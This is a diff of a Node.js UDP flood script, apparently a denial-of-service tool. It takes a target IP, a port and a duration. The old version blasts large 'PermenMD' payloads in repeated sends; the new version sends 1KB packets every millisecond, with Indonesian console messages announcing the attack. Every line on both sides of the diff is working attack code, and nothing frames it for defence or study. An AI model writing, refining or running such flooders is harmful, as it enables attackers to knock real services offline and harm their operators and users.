@@ -1,53 +1,32 @@
-const dgram = require('dgram');
+const dgram = require("dgram");
+const process = require("process");
 
-const target = process.argv[2];
-const port = process.argv[3];
-const duration = process.argv[4]
-function generatePayload(size) {
-    let payload = Buffer.alloc(size);
-    payload.fill('PermenMD');
-    return payload;
+if (process.argv.length < 5) {
+    console.log(`Usage: node ${process.argv[1]} <IP> <PORT> <TIME>`);
+    process.exit(1);
 }
 
-const payload = generatePayload(65500);
+const targetIP = process.argv[2];
+const targetPort = parseInt(process.argv[3]);
+const duration = parseInt(process.argv[4]); // dalam detik
 
-setInterval(() => {
-    const socket = dgram.createSocket('udp4');
-    for (let p = 0; p < 50; p++) {
-socket.send(payload, 0, payload.length, port, target);
-socket.send(payload, 0, payload.length, port, target);
-socket.send(payload, 0, payload.length, port, target);
-socket.send(payload, 0, payload.length, port, target);
-socket.send(payload, 0, payload.length, port, target);
-socket.send(payload, 0, payload.length, port, target);
-socket.send(payload, 0, payload.length, port, target);
-socket.send(payload, 0, payload.length, port, target);
-socket.send(payload, 0, payload.length, port, target);
-socket.send(payload, 0, payload.length, port, target);
-socket.send(payload, 0, payload.length, port, target);
-socket.send(payload, 0, payload.length, port, target);
-socket.send(payload, 0, payload.length, port, target);
-socket.send(payload, 0, payload.length, port, target);
-socket.send(payload, 0, payload.length, port, target);
-socket.send(payload, 0, payload.length, port, target);
-socket.send(payload, 0, payload.length, port, target);
-socket.send(payload, 0, payload.length, port, target);
-socket.send(payload, 0, payload.length, port, target);
-socket.send(payload, 0, payload.length, port, target);
-socket.send(payload, 0, payload.length, port, target);
-socket.send(payload, 0, payload.length, port, target);
+const client = dgram.createSocket("udp4");
+const message = Buffer.alloc(1024, "A"); // Buffer 1KB
+
+console.log(`🚀 Menyerang ${targetIP}:${targetPort} selama ${duration} detik...`);
+
+const endTime = Date.now() + duration * 1000;
+
+function sendFlood() {
+    if (Date.now() > endTime) {
+        console.log("🔥 Serangan selesai!");
+        client.close();
+        process.exit();
+    } else {
+        client.send(message, targetPort, targetIP, (err) => {
+            if (err) console.error("❌ Error:", err);
+        });
     }
-    socket.send(payload, 0, payload.length, port, target, (err) => {
-        if (err) {
-            console.error('Error sending message:', err);
-        }
-        socket.close();
-    });
-});
+}
 
-console.clear();
-console.log(``);
-    setTimeout(() => {
-        console.log('Attack stopped.');
-        process.exit(0);
-    }, duration * 1000);
+setInterval(sendFlood, 1);
